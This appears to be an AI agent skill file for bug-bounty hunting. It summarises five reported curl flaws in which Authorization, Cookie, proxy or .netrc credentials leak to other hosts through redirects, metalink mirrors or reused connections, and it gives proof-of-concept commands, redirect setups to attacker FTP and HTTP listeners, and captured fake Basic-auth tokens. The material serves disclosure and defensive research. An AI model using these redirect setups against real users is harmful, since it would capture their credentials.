---
name: hunter-l3-credential-leak
description: "Use when hunting Credential Leak (curl credential forwarding) on a target. Loads the L3 technique sheet: This class covers bugs where a client tool (here, exclusively curl) leaks credentials — `Authorization`/`Cookie` headers, `--user`/URL passwords, or proxy credentials — to hosts, ports, schemes, or proxies the user never intended."
domain: cybersecurity
subdomain: web
tags:
- web
- credential-leak-curl-credential-forwarding
- hunting
- l3
version: '1.0'
---

# Credential Leak (curl credential forwarding) — Technique Sheet

## Overview

This class covers bugs where a client tool (here, exclusively curl) leaks credentials — `Authorization`/`Cookie` headers, `--user`/URL passwords, or proxy credentials — to hosts, ports, schemes, or proxies the user never intended. The trigger is almost always a redirect (`-L` / 3xx) or a reused connection that fails to reset per-transfer credential state. These pay best on curl itself via the Internet Bug Bounty, and are proven by running an attacker-controlled listener (FTP/HTTP server) and observing the verbatim credential bytes arrive.

## Distinct sub-patterns

### 1. `--metalink` reuses `--user` credentials for all mirror transfers
- Endpoint shape: `curl --metalink --user <user>:<pass> https://<target>/metalinktest.xml`, where the metalink XML lists mirrors on different hosts and cleartext `http://` / `ftp://` protocols.
- Payload that fired (verbatim): `Authorization: Basic cHJvZmVzc29yOkpvc2h1YQ==` (decodes to `professor:Joshua`, the `--user professor:Joshua` supplied for the target site) observed on transfers to outside hosts.
- Root cause: curl applies the `--user` credentials to every transfer spawned from the metalink, including mirror hosts over plaintext http/ftp — credentials never scoped to the original host.
- Impact: Credentials intended only for the target site were sent to unrelated hosts over cleartext, interceptable by any MITM.
- Exemplar: id=1213181 (program: curl).

### 2. Cross-protocol redirect forwards user credentials to an attacker host (HTTPS→FTP)
- Endpoint shape: attacker-controlled HTTP(S) endpoint that 301-redirects to a foreign protocol/host: `301 → ftp://secondsite.tld:9999`. Victim runs: `curl -L --user foo https://firstsite.tld/redirectpoc`.
- Payload: password `secretpassword` observed in cleartext at a fake FTP server (`secondsite.tld:9999`). (Full `--user` string not stated beyond `--user foo` in the record.)
- Root cause: curl's same-host check on redirects ignores cross-protocol redirects and port differences, so `--user` credentials are forwarded to other hosts/protocols. CVE-2022-27774.
- Impact: Cleartext password disclosure to an attacker-chosen FTP host via one crafted redirect on any site the victim authenticates to.
- Exemplar: id=1551586 (program: Internet Bug Bounty).
- Chain (verbatim from record): ["Configure HTTP(S) server to 301-redirect to ftp://secondsite.tld:9999", "Run curl -L with credentials", "Password sent to the unrelated FTP host ove..." (truncated in record)]

### 3. Same-host redirect leaks custom Authorization/Cookie headers to a different port/scheme
- Endpoint shape: any endpoint on `https://hostname.tld` that redirects to `http://hostname.tld:9999/...`. Victim runs: `curl -L -H "Authorization: secrettoken" -H "Cookie: secretcookie" https://hostname.tld/redirectpoc`.
- Payload (verbatim): `Authorization: secrettoken` and `Cookie: secretcookie` headers sent over insecure HTTP to the same host on port 9999.
- Root cause: The same-host check does not verify port or scheme — "same host" passes even though scheme downgraded to HTTP and port changed. CVE-2022-27776.
- Impact: Secret tokens/cookies shipped in cleartext on a wire the user assumed was TLS-protected.
- Exemplar: id=1551591 (program: Internet Bug Bounty).

### 4. Proxy credentials persist across redirect-triggered proxy re-selection
- Endpoint shape: environment with two proxies configured: `http_proxy=http://user:pass@127.0.0.1:8081` and `https_proxy=http://127.0.0.1:8082`; redirect at `http://127.0.0.1:8000/redir` flips the scheme so curl re-selects from https_proxy. Command (verbatim): `http_proxy=http://user:pass@127.0.0.1:8081 https_proxy=http://127.0.0.1:8082 /path/to/curl -k -L http://127.0.0.1:8000/redir`
- Payload (verbatim): `Proxy-Authorization: Basic dXNlcjpwYXNz` received by Proxy B (the second proxy, which was configured with no credentials) on its first CONNECT.
- Root cause: Proxy credentials learned from the originally selected proxy URL persist in per-transfer state and are reused when a redirect re-selects a different proxy. CVE-2026-6253.
- Impact: Proxy-A credentials delivered to a different, untrusted proxy.
- Exemplar: id=3669637 (program: curl).

### 5. .netrc host credentials leak across redirected hosts over a reused keep-alive proxy connection
- Endpoint shape: `.netrc` scoped to host `a.test`; HTTP proxy connection reused (keep-alive); request redirected to `b.test` and `c.test` through the same proxy connection.
- Payload (verbatim): `Authorization: Basic dXNlckE6cGFzc0E=` (i.e. `userA:passA`, configured only for a.test) sent to b.test and c.test.
- Root cause: .netrc-derived host Authorization credentials persist across redirected hosts when the HTTP proxy connection is reused. CVE-2026-6429.
- Impact: Host-scoped credentials delivered to unrelated redirected hosts.
- Exemplar: id=3677759 (program: curl).

## Bypass / chain notes

- All five sub-patterns share one meta-pattern: a state change (redirect, scheme flip, proxy re-selection, connection reuse) that should reset credential scope but doesn't. When hunting, enumerate every state transition: `-L` redirects (host, port, scheme), protocol switches (HTTPS→FTP), proxy selection changes, and keep-alive connection reuse.
- Common chains seen:
  - Attacker page/host issues 301 → cross-protocol URL → victim's `-L` follow delivers credentials to attacker listener (id=1551586).
  - Same-host redirect with port/scheme change defeats the "same host" safety check (id=1551591).
  - Redirect flips scheme → proxy re-selection → stale proxy auth reused (id=3669637).
  - Connection reuse across redirects → stale host auth reused (id=3677759).
- Verification method used throughout: run a local/attacker-controlled listener (fake FTP server on a nonstandard port like 9999, or a plain HTTP server) and capture the raw Authorization/Proxy-Authorization headers arriving. Base64-decode the Basic token to prove the credential contents.

## Gotchas / what NOT to do

- Do not assume the same-host check is safe — it historically ignored port and scheme (1551591); test port- and scheme-changing redirects explicitly.
- Do not test only with `-H` headers; credentials enter via multiple channels — `--user`, `.netrc`, proxy URLs in env vars — and each channel leaks through a different code path (five distinct CVEs here).
- Do not use your real credentials in PoCs; the records used clearly fake ones (`professor:Joshua`, `userA:passA`, `user:pass`).
- Do not stop at the first leak vector: metalink (1213181) leaks even without redirects — mirror lists alone triggered the leak.
- Payloads/redirect targets must be fully attacker-controlled and documented; the credential destination (attacker FTP/HTTP host, foreign proxy) is the core of the impact claim.

## Real-world impact examples

- Cleartext password `secretpassword` captured at attacker FTP server `secondsite.tld:9999` after a single HTTPS→FTP 301 redirect (CVE-2022-27774, id=1551586).
- `Authorization: secrettoken` and `Cookie: secretcookie` sent over plaintext HTTP to port 9999 on the "same" host (CVE-2022-27776, id=1551591).
- `Proxy-Authorization: Basic dXNlcjpwYXNz` delivered to a second proxy that was never configured with credentials (CVE-2026-6253, id=3669637).
- `Authorization: Basic dXNlckE6cGFzc0E=` — scoped to a.test — received by b.test and c.test over a reused proxy connection (CVE-2026-6429, id=3677759).
- Basic-auth credentials for the target site observed arriving at outside mirror hosts over cleartext http/ftp via `--metalink` (id=1213181).